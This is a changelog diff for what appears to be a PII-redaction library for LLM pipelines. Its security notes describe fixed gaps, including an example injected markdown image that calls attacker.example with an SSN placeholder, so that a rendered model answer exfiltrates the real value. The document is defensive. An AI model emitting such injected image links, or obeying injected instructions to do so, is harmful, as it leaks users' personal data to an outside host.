@@ -1,5 +1,34 @@
 # Changelog
 
+## Unreleased
+
+### Security
+
+- Placeholders inside a link or image address in the model's answer are no
+  longer restored (gap G1). An injected
+  `![x](https://attacker.example/?d=<SSN_1>)` used to become an image
+  request carrying the real SSN once the answer was rendered. They stay
+  placeholders, are recorded as `taintward.placeholders.blocked`, and the
+  check also follows links across stream chunks (Google ADK, LlamaIndex,
+  TypeScript `StreamRestorer`). Python and TypeScript. Turn off with
+  `placeholder_restore_in_urls=True`, `restoreInUrls: true` or
+  `TAINTWARD_RESTORE_IN_URLS=1`.
+- Report fingerprints are an HMAC-SHA256 with a secret key, 12 hex
+  characters, instead of an unsalted SHA-256 that could be brute forced for
+  SSNs (gap G6). `TAINTWARD_REPORT_KEY` keeps them stable across reports;
+  without it each report has its own random key.
+- `TAINTWARD_DETECT_MAX_CHARS` (default 500000): a longer value is not
+  scanned and is masked whole, so a huge payload cannot hold a call for
+  seconds (gap G10).
+- `Redactor.reverse` and `tw.restore` are recorded: a `taintward.reverse`
+  span event and a `taintward.audit` log line with the key id and the
+  calling code, never the value (gap G11).
+- Tool outputs are masked in the SDK also with `TAINTWARD_MASK_IN_SDK=0`,
+  because the collector only masks regex types (gap G5).
+- The collector's `taint_policy` processor has a `drop_attributes` option.
+  By default it drops the Google ADK attributes that hold model requests,
+  responses and tool arguments with real values.
+
 ## 0.3.0
 
 ### Added
